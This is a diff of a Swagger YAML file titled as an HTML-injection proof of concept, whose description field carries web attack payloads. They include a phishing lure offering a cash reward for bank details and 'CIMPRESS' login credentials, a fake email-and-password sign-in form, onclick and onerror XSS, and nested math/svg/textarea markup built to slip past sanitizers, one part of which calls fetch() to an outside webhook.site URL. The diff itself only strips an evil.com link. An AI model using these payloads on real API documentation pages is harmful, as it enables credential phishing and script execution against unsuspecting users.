@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: HTML INJECTION FOR POC
   description: |
-    <h1>By k4r4su. To get free 1000$ reward, please go to our partner website and fill up your bank account details needed to send the money or login below with your CIMPRESS CREDENTIALS:</h1> <h1><a href="https://evil.com" onclick="alert('XSS by OneGuard')">Click Here</a></h1>
+    <h1>By k4r4su. To get free 1000$ reward, please go to our partner website and fill up your bank account details needed to send the money or login below with your CIMPRESS CREDENTIALS:</h1> <h1><a onclick=alert('XSS by OneGuard')>Click Here</a></h1>
     <form><label><input id="textbox" type="text" placeholder="EMAIL" style="width:320px;height=30px"></label><br><label><input  id="textbox" type="text" placeholder="PASSWORD" style="width:320px"></label><br><input type="submit" value="SIGN IN" onclick="msg()"></form>
     <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='fetch('https://webhook.site/ece8cc44-cb2f-4e31-a956-f698c0c156a6/?t=tothemoon_swagger');'>">
     <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=print()&gt;">
